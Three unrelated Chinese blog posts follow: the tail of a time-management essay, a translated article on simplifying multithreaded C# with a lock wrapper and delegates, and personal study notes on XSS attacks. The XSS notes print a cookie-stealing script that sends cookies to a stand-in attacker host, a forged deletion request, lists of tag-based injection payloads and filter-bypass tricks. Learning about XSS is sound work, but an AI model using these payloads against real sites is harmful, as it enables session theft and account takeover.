阅读官方文档，由于有中文材料，很快就读完了，顺便还看了下vue的一些周边框架，如 vux 、mui。
第二个小时
阅读别人的博客案例，我找了五篇博客，每一篇都不大一样，关键是其中的一些API用法不尽相同，于是产生了疑惑，开始寻求答案。
于是不停翻看 vue 的 api 说明，对比不同版本内 api 的用法。
然后严重的事情发生了，我开始纠结于使用哪个版本进行学习，是使用最稳定的呢？还是用最新的开发版。
那些流行的 UI 框架又是基于哪个版本开发的，我又开始一通乱找，看看那些 vue版本的比较，看看那些vue生态那些优秀的UI框架支持什么版本。
三个小时过去了，我还是没能做出抉择，眼看时间一点点过去，索性不管了，就用最新的吧...
第三个小时
不，应该是第五个小时了，我肚子饿了，于是拿起手机叫个外卖，美团上的优惠券好多阿，不管了，先领了再说。
什么？优惠券要指定商家才能使用？于是又检索几家店家...这次，花掉了一个十亿级大表全表扫描的时间，大概是半小时吧。然后，为了保证后面的精神头，花了半小时午睡。

第六个小时
我已经确定要用什么版本了。可是问题来了，我应该用什么IDE进行开发呢？WebStorm好像不错，但是听老王说很重量级。IDEA也可以用，但是毕竟是JAVA的工具...
好了，强迫症再次上头，花十分钟安装WebStom并体验了下觉得不舒服，又转而使用IDEA的插件，这时候，四十分钟过去了。
接下来，凭借自己"强大的抽象思维"快速定义好了接口和基础界面，只花了二十分钟！
第七个小时
整合 vue.js ，把 vue.js 下载并整合到代码里，接下来完成逻辑代码编写，只花了二十分钟。之后开始调试，但在我的浏览器怎么样也没法调通，于是怀疑是浏览器版本问题，换了chrome/firefox 都还是不行之后，又怀疑是代码写得不对，重新编写代码..一通乱麻之后，才找到真正原因：引入其他框架冲突了..，通过网上介绍的办法解决了问题。
一看手机，一个半小时过去了，距离一开始的计划，我花了两倍的时间！ 而且，我竟然还把外卖的事情给忘了..

看，这就是一个跟时间管理有关的例子，不知道你会不会有似曾相识的感觉呢？
所以我想说时间很难管理，本质上或许更多的来源于目标的不清晰、又或是意志力不够坚定、旧的坏习惯使然等等。
是什么偷走了时间
前面的例子，听起来更像是一个强迫症和重度拖延症患者的故事。但是在平时的工作里面，一定会有非常多的事情像洪水一样想要吞噬你的计划。
比如：
A. 各种打断式的会议
事实上，有很多的会议都不是必须的，或者说有80%的会议里面，其中80%的时间都是不必要的。
这听取起来好像耸人听闻，但仔细回想你参加过的每一个会议，最终剩余的价值是什么？ 会议纪要！没错，只有会议后的纪要能被记住并使用。
那么会议纪要内容有多少，一般都不多，沟通效率非常高的话，10%的会议时间可能就足够了。
打断式的会议，除了会议本身的时长之外，程序员可能还需要花费一定时间在大脑中做切换，而且这个时间比其他职业会高一些的。
B. "缺斤少两"的交付
关于这点，偏向于指技术债务、或文档债务，技术债务呢，比如你的代码写得太随意，可靠性不好，心想着反正现在也没啥问题，就先这样吧。
但在未来的某些场景下，问题被暴露出来了还是要你来修复(如果你跑路了可能另当别论)。文档债务也很常见，许多开发的不喜欢写文档，其实是懒，那么到后来，
会不断的有人来问你，A是怎么回事，B又是怎么来的.. 烦不胜烦。这些都在你的计划内吗？
一句话，出来混的，始终还是要还的！
C. 邮件的魔力
当大家都喜欢上发邮件时，你看邮件，总会想要一下子把收件箱的未读邮件全部看完、每一封需要回复的都要回复完。
甚至在干活的时候，是不是也会点开Outlook客户端去检查一下，生怕有漏..
一次次的切换，会导致你不专心、走神，精神及代码质量低下.. 或者，让自己上下班临界时间处理邮件，是个办法。
D. 座位上的叨扰
总有些人，会特别喜欢面对面沟通，觉得这样效率是最高的。没错，"你“的效率的确是提高了，但别人呢？
这类现象发生在很多项目经理、产品经理身上，他们脱离技术工作已久，或许已经不会从别人的角度去思考问题了。
那么对于他们来说，日常的工作就是面对面沟通，认为这已经不足为奇了。但对于程序员来说，长期以往可能是个噩梦！

上面的这些，都是我平时工作经历过的东西，而且相信，大多数人也正在经受这样的事情。
可能小团队不会有，大中型企业会有，不善管理的部门很严重...
有什么良药
时间管理既然这么难，又有这么多的事情烦扰，那还做什么管理？
我认为，尽管现阶段可能不会有什么包好的方法，但时间管理还是要做，不做，那跟咸鱼有什么分别呢？
《高效能认识的七个习惯》、《番茄工作法图解》都是一些畅销书，为啥畅销，就是因为太多人都希望做好时间管理了。
但光凭看书不行，还得实战、不停的修炼不是？ 那我炼了这么久，有啥心得体会呢？
1. 尝试给自己更多的时间，尤其是学习类的目标给够预留的部分。
2. 把目标写下来做分解，一条条读一遍看看哪些重要哪些不重要，最终只要重要的完成就好了。
3. 认识时间不好管理的现实，做好失败的准备，尽量消除焦虑。
后记
你是一个重度拖延症患者，还是一个自我管理强人？对于时间管理，你怎么看呢，欢迎留言讨论


https://www.cnblogs.com/littleatp/p/10581746.html
**************************************************
【译】最大限度地降低多线程 C# 代码的复杂性
分支或多线程编程是编程时最难最对的事情之一。这是由于它们的并行性质所致，即要求采用与使用单线程的线性编程完全不同的思维模式。对于这个问题，恰当类比就是抛接杂耍表演者，必须在空中抛接多个球，而不要让它们相互干扰。这是一项重大挑战。然而，通过正确的工具和思维模式，这项挑战是能应对的。
本文将深入介绍我为了简化多线程编程和避免争用条件、死锁等其他问题而编写的一些工具。可以说，工具链以语法糖和神奇委托为依据。不过，引用伟大的爵士音乐家 Miles Davis 的话：“在音乐中，没有声音比有声音更重要。” 声音间断就产生了奇迹。
从另一个角度来说，不一定是关乎可以编码什么，而是关乎可以选择不编码什么，因为你希望通过间断代码行产生一点奇迹。引用 Bill Gates 的一句话：“根据代码行数来衡量工作质量就像通过重量来衡量飞机质量一样。” 因此，我希望能帮助开发人员减少编码量，而不是教导开发人员如何编写更多代码。
同步挑战
在多线程编程方面遇到的第一个问题是，同步对共享资源的访问权限。当两个或多个线程共享对某个对象的访问权限且可能同时尝试修改此对象时，就会出现这个问题。当 C# 首次发布时，lock 语句实现了一种基本方法，可确保只有一个线程能访问指定资源（如数据文件），且效果很好。C# 中的 lock 关键字很容易理解，它独自颠覆了我们对这个问题的思考方式。
不过，简单的 lock 存在一个主要缺陷：它不区分只读访问权限和写入访问权限。例如，可能要从共享对象中读取 10 个不同的线程，并且通过 System.Threading 命名空间中的 ReaderWriterLockSlim 类授权这些线程同时访问实例，而不导致问题发生。与 lock 语句不同，此类可便于指定代码是将内容写入对象，还是只从对象读取内容。这样一来，多个读取器可以同时进入，但在其他所有读写线程均已完成自己的工作前，拒绝任何写入代码访问。
现在的问题是：如果使用 ReaderWriterLock 类，语法就会变得很麻烦，大量的重复代码既降低了可读性，又随时间变化增加了维护复杂性，并且代码中通常会分散有多个 try 和 finally 块。即使是简单的拼写错误，也可能会带来日后有时极难发现的灾难性影响。 
通过将 ReaderWriterLockSlim 封装到简单的类中，这个问题瞬间解决，不仅重复代码不再会出现，而且还降低了小拼写错误毁一天劳动成果的风险。图 1 中的类完全基于 lambda 技巧。可以说，这就是对一些委托应用的语法糖（假设存在几个接口）。最重要的是，它在很大程度上有助于实现避免重复代码原则 (DRY)。
图 1：封装 ReaderWriterLockSlim


 1 public class Synchronizer<TImpl, TIRead, TIWrite> where TImpl : TIWrite, TIRead {
 2     ReaderWriterLockSlim _lock = new ReaderWriterLockSlim ();
 3     TImpl _shared;
 4 
 5     public Synchronizer (TImpl shared) {
 6         _shared = shared;
 7     }
 8 
 9     public void Read (Action<TIRead> functor) {
10         _lock.EnterReadLock ();
11         try {
12             functor (_shared);
13         } finally {
14             _lock.ExitReadLock ();
15         }
16     }
17 
18     public void Write (Action<TIWrite> functor) {
19         _lock.EnterWriteLock ();
20         try {
21             functor (_shared);
22         } finally {
23             _lock.ExitWriteLock ();
24         }
25     }
26 }


图 1 中只有 27 行代码，但却精妙简洁地确保对象跨多个线程进行同步。此类假定类型中有读取接口和写入接口。如果由于某种原因而无法更改需要将访问权限同步到的基础类实现，也可以重复模板类本身三次，通过这种方式使用它。基本用法如图 2 所示。
图 2：使用 Synchronizer 类


 1 interface IReadFromShared {
 2     string GetValue ();
 3 }
 4 
 5 interface IWriteToShared {
 6     void SetValue (string value);
 7 }
 8 
 9 class MySharedClass : IReadFromShared, IWriteToShared {
10     string _foo;
11 
12     public string GetValue () {
13         return _foo;
14     }
15 
16     public void SetValue (string value) {
17         _foo = value;
18     }
19 }
20 
21 void Foo (Synchronizer<MySharedClass, IReadFromShared, IWriteToShared> sync) {
22     sync.Write (x => {
23         x.SetValue ("new value");
24     });
25     sync.Read (x => {
26         Console.WriteLine (x.GetValue ());
27     })
28 }



在图 2 的代码中，无论有多少线程在执行 Foo 方法，只要执行另一个 Read 或 Write 方法，就不会调用 Write 方法。不过，可以同时调用多个 Read 方法，而不必在代码中分散多个 try/catch/finally 语句，也不必不断重复相同的代码。我在此郑重声明，通过简单字符串来使用它是没有意义的，因为 System.String 不可变。我使用简单的字符串对象来简化示例。

基本思路是，必须将所有可以修改实例状态的方法都添加到 IWriteToShared 接口中。同时，应将所有只从实例读取内容的方法都添加到 IReadFromShared 接口中。通过将诸如此类的问题分散到两个不同的接口，并对基础类型实现这两个接口，可使用 Synchronizer 类来同步对实例的访问权限。这样一来，将访问权限同步到代码的做法变得更简单，并且基本上可以通过更具声明性的方式这样做。
在多线程编程方面，语法糖可能会决定成败。调试多线程代码通常极为困难，并且创建同步对象的单元测试可能会是徒劳无功之举。
如果需要，可以创建只包含一个泛型参数的重载类型，不仅继承自原始 Synchronizer 类，还将它的一个泛型参数作为类型参数三次传递到它的基类。这样一来，就不需要读取接口或写入接口了，因为可以直接使用类型的具体实现。不过，这种方法要求手动处理需要使用 Write 或 Read 方法的部分。此外，虽然它的安全性稍差一点，但确实可便于将无法更改的类包装到 Synchronizer 实例中。
用于分支的 lambda 集合
迈出第一步来使用神奇的 lambda（或在 C# 中称为“委托”）后，不难想象，可以利用它们完成更多操作。例如，反复出现的常见多线程主题是，让多个线程与其他服务器联系，以提取数据并将数据返回给调用方。
最简单的例子就是，应用程序从 20 个网页读取数据，并在完成后将 HTML 返回给一个根据所有网页的内容创建某种聚合结果的线程。除非为每个检索方法都创建一个线程，否则此代码的运行速度比预期慢得多：99% 的所有执行时间可能会花在等待 HTTP 请求返回上。
在一个线程上运行此代码的效率很低，并且线程创建语法非常容易出错。随着你支持多个线程及其助理对象，挑战变得更严峻，开发人员不得不在编写代码时使用重复代码。意识到可以创建委托集合和用于包装这些委托的类后，便能使用一个方法调用来创建所有线程。这样一来，创建线程就轻松多了。
图 3 中的一段代码创建两个并行运行的此类 lambda。请注意，此代码实际上来自我的第一版 Lizzie 脚本语言的单元测试 (bit.ly/2FfH5y8)。
图 3：创建 lambda


 1 public void ExecuteParallel_1 () {
 2     var sync = new Synchronizer<string, string, string> ("initial_");
 3 
 4     var actions = new Actions ();
 5     actions.Add (() => sync.Assign ((res) => res + "foo"));
 6     actions.Add (() => sync.Assign ((res) => res + "bar"));
 7 
 8     actions.ExecuteParallel ();
 9 
10     string result = null;
11     sync.Read (delegate (string val) { result = val; });
12     Assert.AreEqual (true, "initial_foobar" == result || result == "initial_barfoo");
13 }


仔细看看这段代码便会发现，计算结果并未假定我的两个 lambda 的执行存先后顺序。执行顺序并未明确指定，并且这些 lambda 是在不同的线程上执行。这是因为，使用图 3 中的 Actions 类，可以向它添加委托，这样稍后就能决定是要并行执行委托，还是按顺序执行委托。
为此，必须使用首选机制创建并执行许多 lambda。在图 3 中可以看到前面提到的 Synchronizer 类，用于同步对共享字符串资源的访问权限。不过，它对 Synchronizer 使用了新方法 Assign，我并未在图 1中的列表内为 Synchronizer 类添加此方法。Assign 方法使用前面 Write 和 Read 方法中使用的相同“lambda 技巧”。
若要研究 Actions 类的实现，请务必下载 Lizzie 版本 0.1，因为我在后面推出的版本中完全重写了代码，使之成为独立编程语言。
C# 中的函数式编程
大多数开发人员往往认为，C# 几乎与面向对象的编程 (OOP) 同义或至少密切相关，事实显然如此。不过，通过重新思考如何使用 C#，并深入了解它的各方面功能，解决一些问题就变得更加简单了。目前形式的 OOP 不太易于重用，原因很多是因为它是强类型。
例如，如果重用一个类，就不得不重用初始类引用的每个类（在两种情况下，类都是通过组合和继承进行使用）。此外，类重用还会强制重用这些第三方类引用的所有类等。如果这些类是在不同的程序集中实现，必须添加各种各样的程序集，才能获得对一个类型上单个方法的访问权限。
我曾经看过一个可以说明这个问题的类比：“虽然想要的是香蕉，但最终得到的是手拿香蕉的大猩猩，以及大猩猩所居住的热带雨林。” 将这种情况与使用更动态的语言（如 JavaScript）进行重用做比较，后者并不关心类型，只要它实现函数本身使用的函数即可。通过略微宽松类型方法生成的代码更灵活、更易于重用。委托可以实现这一点。
可使用 C# 来改善跨多个项目重用代码的过程。只需要理解函数或委托也可以是对象，并且可以通过弱类型方式控制这些对象的集合。
早在 2018 年 11 月发行的《MSDN 杂志》中，我发表过一篇标题为“使用符号委托创建你自己的脚本语言”的文章 (msdn.com/magazine/mt830373)。本文中提到的有关委托的思路是在这篇文章的基础之上形成。本文还介绍了 Lizzie，这是我的自制脚本语言，它的存在归功于这种以委托为中心的思维模式。如果我使用 OOP 规则创建了 Lizzie，我会认为，它在大小上可能至少大一个数量级。
当然，如今 OOP 和强类型处于主导地位，想要找到一个主要必需技能不要求它的职位描述，几乎是不可能的。我在此郑重声明，我创建 OOP 代码的时间已超过 25 年，所以，我与任何人一样都会因为对强类型有偏见而感到内疚。然而，如今我在编码方法上更加务实，对类层次结构的最终外观失去兴趣。
并不是我不欣赏外观精美的类层次结构，而是收益递减。添加到层次结构中的类越多，它就变得越臃肿，直到因不堪重压而崩溃。有时，卓越的设计只用很少的方法、更少的类和大多数松散耦合的函数，这样就可以轻松扩展代码，也就不需要“引入大猩猩和热带雨林”了。
回到本文反复出现的主题（从 Miles Davis 的音乐方法中获得灵感）：少即是多（“没有声音比有声音更重要”）。 代码也不例外。间断代码行往往会产生奇迹，最佳解决方案的衡量依据更多是不编码什么，而不是编码什么。连傻瓜也可以将喇叭吹响，但只有为数不多的人才能用喇叭吹奏出音乐。像 Miles 这样能创造出奇迹的人就更少了。
 

 原文作者：Thomas Hansen
原文地址：Minimize Complexity in Multithreaded C# Code
https://www.cnblogs.com/leolion/p/10581723.html
**************************************************
前端Hack之XSS攻击个人学习笔记
简单概述
**
       此篇系本人两周来学习XSS的一份个人总结，实质上应该是一份笔记，方便自己日后重新回来复习，文中涉及到的文章我都会在末尾尽可能地添加上，此次总结是我在学习过程中所写，如有任何错误，敬请各位读者斧正。其中有许多内容属于相关书籍、文章的部分摘取，如有侵权，请联系我修改。(asp-php#foxmail.com)
**

1) 什么是XSS?

       XSS(Cross-Site Script,跨站脚本)是由于web应用程序对用户的输入过滤不足而产生的一种漏洞。攻击者可以利用网站漏洞把恶意的脚本代码注入到网页之中，当其他用户浏览这些带有恶意代码的网页时就会执行其中的恶意代码，对受害者产生各种攻击。

       如果对以上描述还不是很了解的话，可以参考百度百科
       在余弦大大和xisigr大大的书籍《Web前端安全技术揭秘》第三章中这样说道：

跨站脚本的重点不在“跨站”上，而应该在“脚本”上...因为这个“跨”实际上属于浏览器的特性，而不是缺陷，造成“跨”的假象是因为绝大多数的XSS攻击都会采用嵌入一段远程或者说第三方域上的脚本资源。

       确实，当攻击者的服务器上的js嵌入到受害者的页面，至于接下来的攻击就是关于“脚本”的事了。
2) XSS可以带来哪些危害？
       对于XSS攻击的危害，大多数的人们却没有正确的认识，实际上攻击者可以利用XSS攻击造成巨大的危害。比如：

网页挂马;
盗取Cookie;
DoS攻击;
钓鱼攻击;
蠕虫攻击;
劫持用户web行为;
结合CSRF进行针对性攻击;
······

这些都是可以利用XSS漏洞来达成的。
3) XSS类型
目前的XSS总共可以分为三种类型：

反射型(也叫非持久型)
存储型(也叫持久型)
DOM型

PS：前两种XSS都会与服务器产生交互，后一种不会产生交互。(某安全大佬面试)
反射型XSS

       反射型XSS，也称非持久型XSS，最常见也是使用最广的一种。在反射型XSS中，payload一般存在于网页的Url中，只用户单击时触发，只执行一次，非持久化，故称反射型XSS。攻击者发送恶意Url链接让受害者点击(一般会对payload部分进行处理，如：编码转换和短域名跳转)

       由于篇幅问题，关于反射型XSS我就不做过多简述。
       有的人认为反射型XSS需要用户已经登陆的情况下才能利用，其实不然。我们可以通过反射型xss让浏览器远程嵌入我们的js文件，然后配合浏览器漏洞进行RCE攻击。这里给出个相近的例子：记一次从DOM型XSS到RCE过程。
存储型XSS
       存储型XSS，也称持久型XSS，攻击者首先将恶意javascript代码上传或存储到漏洞服务器中，只要受害者浏览包含此恶意javascript页面就会执行恶意代码，不需要用户点击特定Url就能执行，故存储型XSS比反射型XSS更具威胁性。--- 《XSS跨站脚本攻击剖析与防御》
       存储型XSS与反射型XSS最大的区别就在于提交的XSS代码会储存于服务端，下次再访问目标页面时不用再提交XSS代码。---《Web前端黑客技术揭秘》
DOM型XSS
       许多朋友对反射型XSS和存储型XSS都比较清楚，可是却不太了解什么是DOM型XSS，没关系，看完这里你就应该会对DOM型XSS有个大概认识
       DOM,即Document Object Model(文件对象模型)的缩写，关于DOM的概念想了解的朋友可以在百度百科得到相应的解答。
       DOM型XSS是如何产生的？我们知道，客户端javascipt是可以访问浏览器的DOM文本对象模型，如果没有经过适当的过滤和消毒，那么应用程序可能会受到基于DOM的XSS攻击。
       在刺的《白帽子讲Web安全》是这样讲的：

通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS，也就是DOM型XSS。

       举个简单的例子(来自《Web前端黑客技术揭秘》)：
<html>
...
<script>
var a=document.URL;
document.write(a.substring(a.indexOf("a=")+2,a.length));
</script>
...
</html>
       把以上代码保存为1.html,然后打开浏览器访问http://127.0.0.1/1.html#a=test
       我们知道这是个静态页面，而且#后边的内容并不会传给服务器。

       可是这样就不会产生XSS漏洞了吗？如果我们访问
http://127.0.0.1/.html#a=<script>alert(/xss/)</script>
       当我们访问上述url时，服务器会返回源代码，我们可以用抓包工具截取，发现与正常访问的页面无差别，可是当浏览器收到源代码时便把HTML文本解析成DOM对象并执行，结果弹出/xss/消息框，感兴趣的朋友可以试试。
       具体执行过程如图：
4) XSS的利用方式
       前面我们介绍了各种XSS的特点及产生方式，现在我们来说说如何利用这些漏洞。
Cookie窃取
       Cookie盗取是xss攻击中最实用也是最广泛的一种利用方式之一。我们知道Cookie是Web系统识别用户的身份和保存会话状态的主要机制，且是由服务器提供的、存储在客户端的一种数据。同时，对于cookie的操作十分的方便，我们可以通过Document对象访问Cookie。如：<script>alert(document.cookie)</script>会弹出当前页面的cookie信息。

       这里我们引入一个叫做“同源策略”的概念：

首先，同“源”的源不单单是指两个页面的主域名，还包括这两个域名的协议、端口号和子级域名相同。举个例子，假设我现在有一个页面http://www.a.com/index.html，域名是 www.a.com，二级域名为 www,协议是 http，端口号是默认的 80，这个页面的同源情况如下：
       同源策略存在的意义就是为了保护用户的信息的安全。一般网站都会把关于用户的一些敏感信息存在浏览器的 cookie 当中试想一下，如果没有同源策略的保护，那么 b 页面也可以随意读取 a 页面存储在用户浏览器 cookie 中的敏感信息，就会造成信息泄露。如果用户的登录状态被恶意网站能够随意读取，那后果不堪设想。由此可见，同源策略是非常必要的，可以说是浏览器安全的基石。
       除了 cookie 的访问受到同源策略的限制外，还有一些操作也同样受到同源策略的限制：
       (1) 无法读取非同源网页的 Cookie 、sessionStorage 、localStorage 、IndexedDB
       (2) 无法读写非同源网页的 DOM
       (3) 无法向非同源地址发送 AJAX请求（可以发送，但浏览器会拒绝响应而报错）

       ————引自晚风表哥在信安之路上的投稿文章《同源策略与跨域请求》

       我们知道Cookie有如下常见的属性：

Domain————设置关联Cookie的域名;
Expires————通过给定一个过期时间来创建一个持久化Cookie;
Httponly————用于避免Cookie被Javascript访问;
Name————Cookie的名称;
Path————关联到Cookie的路径，默认为/;
Value————读写Cookie的值;
Secure————用于指定Cookie需要通过安全Socket层传递连接;

       并且Cookie也可以安装类型分为：

本地Cookie————即储存在计算机硬盘中，关闭浏览器后依旧存在;
内存Cookie————即储存在内存中，随浏览器的关闭而消失;

       如何区分两者很简单，只要判断cookie中的expires即过期时间属性有没有设置，如果设置了即为本地cookie，反之为内存cookie。
       由于Cookie具有的不同属性，我们可以将不同属性的Cookie盗取方式分为以下几种情况
默认
       默认情况，即不对Cookie的任何属性进行指定就设置Cookie的情况。这种情况下Cookie的获取最为简单。可以通过下列方式获取
<script>
new Image().src="http://www.hacker.com/cookie.php?cookie="+document.cookie;
</script>
不同域
       这是由于domain字段的机制导致的。一个Cookie如果不知道domain的值，则默认为本域。
       例如有两个网站www.a.com和test.a.com且后者存在xss漏洞，按照同源策略，这两个网站是不同源的，默认情况下我们无法直接从test.a.com获取到www.a.com的Cookie，可是如果www.a.com的Cookie值中的domain属性设置为父级域即a.com，就可以通过test.a.com的xss漏洞获取到www.a.com的Cookie值。
不同路径
       这是由于path字段的机制导致的。在设置Cookie时，如果不指定path的值，默认就是目标页面的路径。比如在www.a.com/admin/index.php设置cookie值且不知道path，那么path默认为/admin/。javascript可以指定任意路径的cookie，但是只有对于path值的目录下才能读取Cookie,即上述例子中只有/admin/目录下的javascipt才能读取前边设置的Cookie。
Http Only
       HttpOnly是指仅在Http层面上传输的Cookie，当设置了HttpOnly标志后，客户端脚本就无法读取该Cookie，这样做能有效防御XSS攻击获取Cookie，也是目前防御XSS的主流手段之一。不过利用某些特定方式也可以同样读取到标志了HttpOnly的Cookie。

利用调试信息，如：PHP的phpinfo()和Django的调试信息，里边都记录了Cookie的值，且标志了HttpOnly的Cookie也同样可以获取到。
利用Apache Http Server 400错误暴露HttpOnly Cookie的特点。

感兴趣的朋友可以查阅相关资料(《Web前端黑客技术揭秘》p36-39)
Secure
       Secure是指设置了Secure的Cookie尽在HTTPS层面上进行安全传输，如果请求是HTTP的，则不会带上改Cookie，这样做的好处是可以降低Cookie对中间人攻击获取的风险，不过对我们此处讨论的XSS攻击无拦截效果，可通过默认情况下获取。
P3P
       HTTP响应头的P3P字段可以用于标识是否允许目标网站的Cookie被另一域通过加载目标网站而设置或发送，据说仅IE支持（17年）。
       我们来举个例子，在A域通过iframe等方式加载B域(此时也称B域为第三方域)，如果我们想通过B域来设置A域的Cookie，或加载B域时带上B域的Cookie，这时就得涉及到P3P。
B域设置A域Cookie
       在IE下默认是不允许第三方域设置的的，除非A域在响应头带上P3P字段。当响应头头带上P3P后，IE下第三方域即可进行对A域Cookie的设置，且设置的Cookie会带上P3P属性，一次生效，即使之后没有P3P头也有效。
加载B域时Cookie传入问题
       我们知道Cookie分为内存Cookie和本地Cookie，当我们通过A域加载B域时，默认是带内存Cookie加载(如果无内存Cookie则不带)，而如果想要带本地Cookie加载，则本地Cookie必须带P3P属性。

相关文章：用P3P header解决iframe跨域访问cookie

相关阅读：《Web前端黑客技术揭秘》p41-42

会话劫持
       由于Cookie的不安全性，开发者们开始使用一些更为安全的认证方式——Session。
       这里引用《XSS跨站脚本攻击剖析与防御》p51-52页的内容

       Session的中文意思是会话，其实就是访问者从到达特定主页到离开的那段时间，在这个过程中，每个访问者都会得到一个单独的Session。Session是给予访问的进程，记录了一个访问的开始到结束，搭档浏览器或进程关闭之后，Session也就“消失”了。
       在Session机制中，客户端和服务端也有被其他人利用的可能。
       Session和Cookie最大的区别在于：Session是保存在服务端的内存里面，而Cookie保存于浏览器或客户端文件里面

       这里提到Session是因为我们在现实情况中可能会出现已经获取到了Cookie，但是由于用户已经退出了浏览器指示Session无效，导致我们无法通过Cookie欺骗来获取用户权限；又比如有的网站设置了HttpOnly，获取不到Cookie；再者有的网站将Cookie与客户端IP向绑定；此时我们便可以利用会话劫持来达到目的。
       会话劫持的实质就是模拟GET/POST请求(带Cookie)通过受害者浏览器发送给服务器，我们可以通过下面的方式来完成。

通过javascript控制DOM对象来发起一个GET请求，如：

var img = document.creatElement("img");
img.src = "http://www.a.com/del.php?id=1";
document.body.appendChild(img);

通过javascript自动构造隐藏表单并提交(POST)
通过XMLHttpRequest直接发送一个POST请求

       我们可以通过构造的GET/POST请求来实现如添加管理员、删除文章、上传文件等操作。XSS蠕虫从某种意义上来说也属于会话劫持。
钓鱼
       现在一般我们都可以很容易的防范钓鱼网站，可是当钓鱼网站与XSS漏洞结合呢？设想一下，如mail.qq.com的页面存在XSS漏洞，攻击者通过iframe替换了原来的页面成钓鱼页面，并且网页的Url还是原来的页面，你是否能察觉出来？
XSS重定向钓鱼
       即从www.a.com通过xss漏洞跳转到www.b.com的钓鱼页面上，整个过程变化明显，受害者易察觉。
http://www.a.com/index.php?search=<script>document.location.href="http://www.b.com/index.php"</script>
HTML注入式钓鱼
       通过javascript来修改页面的DOM对象属性，或在原页面中添加新的DOM元素。前者相对于后者更隐蔽。
Iframe
       攻击者通过javascript来添加一个新的<Iframe>标签嵌入第三方域的内容(钓鱼网页)，此时主页面仍处于正常页面下，具有极高的迷惑性。
5) XSS漏洞的挖掘
       就目前而言，XSS漏洞的挖掘主要分为白盒审计和黑盒Fuzz两种。
白盒审计
       通过查看源代码来判断网站的交互点是否存在安全过滤。由于此处涉及代码审计内容(其实就是懒)，就细说，这里直接引用书中总结的。

分析源代码挖掘XSS的一般思路是：查找可能在页面输出的变量，检验它们是否受到控制，然后跟踪这些变量的传递过程，分析它们是否被htmlencode()之类的函数过滤

黑盒审计
       这个可得好好说说了，毕竟我们在现实环境中挖掘XSS漏洞时黑盒的情况偏多。我们进行XSS黑盒测试时主要分为手工检测和工具检测。
手工检测
       首先我们需要尽可能地找到目标的每个输入输出点并挨个尝试；在进行尝试的时候，我们应优先选择特殊字符进行测试，如"<>&;/':等，如果连<>都未过滤/转义，那么该输入点很可能存在XSS漏洞。
       如果<>等标记符号都被过滤/转义了，我们也可以使用标签自身的属性/事件(href,lowsrc,bgsound,backgroud,value,action,dynsrc等)来触发XSS,如
<input name="xx" value=<?=$query?>>这里的$query属于动态内容，我们把他替换成恶意代码，最终的代码为<input name="xx" value=xss onmouseover=evil_script>。
       一般来说，针对输入框的黑盒测试可能存在反射型XSS，也可能存在存储型XSS，还有可能是DOM型，针对Url参数的黑盒测试绝大多数只存在反射型XSS或DOM型XSS。
常见标签
<img>标签
利用方式1
<img src=javascript:alert("xss")>
<IMG SRC=javascript:alert(String.formCharCode(88,83,83))>
<img scr="URL" style='Xss:expression(alert(/xss));'
<!--CSS标记xss-->
<img STYLE="background-image:url(javascript:alert('XSS'))">
XSS利用方式2
<img src="x" onerror=alert(1)>
<img src="1" onerror=eval("alert('xss')")>
XSS利用方式3
<img src=1 onmouseover=alert('xss')>
<a>标签
标准格式
<a href="https://www.baidu.com">baidu</a>
XSS利用方式1
<a href="javascript:alert('xss')">aa</a>
<a href=javascript:eval(alert('xss'))>aa</a>
<a href="javascript:aaa" onmouseover="alert(/xss/)">aa</a>
XSS利用方式2
<script>alert('xss')</script>
<a href="" onclick=alert('xss')>aa</a>
利用方式3
<a href="" onclick=eval(alert('xss'))>aa</a>
利用方式4
<a href=kycg.asp?ttt=1000 onmouseover=prompt('xss') y=2016>aa</a>
input标签
标准格式
<input name="name" value="">
利用方式1
<input value="" onclick=alert('xss') type="text">
利用方式2
<input name="name" value="" onmouseover=prompt('xss') bad="">
利用方式4
<input name="name" value=""><script>alert('xss')</script>
<form>标签
XSS利用方式1
<form action=javascript:alert('xss') method="get">
<form action=javascript:alert('xss')>
XSS利用方式2
<form method=post action=aa.asp? onmouseover=prompt('xss')>
<form method=post action=aa.asp? onmouseover=alert('xss')>
<form action=1 onmouseover=alert('xss)>
XSS利用方式3
<!--原code-->
<form method=post action="data:text/html;base64,<script>alert('xss')</script>">
<!--base64编码-->
<form method=post action="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
<iframe>标签
XSS利用方式1
<iframe src=javascript:alert('xss');height=5width=1000 /><iframe>
XSS利用方式2
<iframe src="data:text/html,&lt;script&gt;alert('xss')&lt;/script&gt;"></iframe>
<!--原code-->
<iframe src="data:text/html;base64,<script>alert('xss')</script>">
<!--base64编码-->
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
XSS利用方式3
<iframe src="aaa" onmouseover=alert('xss') /><iframe>
XSS利用方式3
<iframe src="javascript&colon;prompt&lpar;`xss`&rpar;"></iframe>
svg<>标签
<svg onload=alert(1)>
iframe
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4="></iframe>
——引自wkend的文章《XSS小节》
工具检测
       关于XSS的自动检测软件有许多，如Burp的Scan模块，BruteXSS等，这里不做过多解释。
6) shellcode的绕过
绕过XSS-Filter
       XSS-Filter是一段基于黑名单的过滤函数，大多数CMS都有这么个函数，作用于用户的每一个输入点，用于过滤可能的恶意代码。不过从某种意义上来说，基于黑名单的保护是一定不会是安全的，由于XSS的多变性，几乎不可能存在完全地过滤。
空格回车和Tab
       对XSS-Filter而言，如果仅仅是将函数加入黑名单处理，那么可以在函数名称之中尝试加入空格、回车、Tab等键位符来进行绕过。这是由于在javascript中只会将;作为语句的终止符，当浏览器引擎解析javascript脚本时没有匹配到;便会继续处理，知道发现下个分号为止，而换行符并不是终止符。如下列代码可绕过对关键字javascript|alert的过滤：
<img src=javasc
ript:aler
t(/xss/)>

对标签属性值进行转码
       HTML中属性值支持ASCII码形式，如
<img src="javascript:alert('xss');">
       替换成
<img src="javascrip&#116&#58alert('xss');">
       其中在ASCII表中116为t，58为:。
       也可以将&#01,&#02等插入javascript的头部，还可以将tab(&#09)|换行符(&#10)|回车键(&#13)插入到代码中的任意位置。
Fuzz标签未过滤事件名
       如<img src=x onerror=alert(/xss/)>其中的onerror即为IMG标签的一个事件，通常这样的事件都是以on开头，常见的有:
onResume
onReverse
onSeek
onSynchRestored
onURLFlip
onRepeat
onPause
onstop
onmouseover
       除此之外还有很多事件可以利用，这里不再一一列举。
使用Css绕过
       利用Css样式表可以执行javascript的特性，如
       Css直接执行javascript：
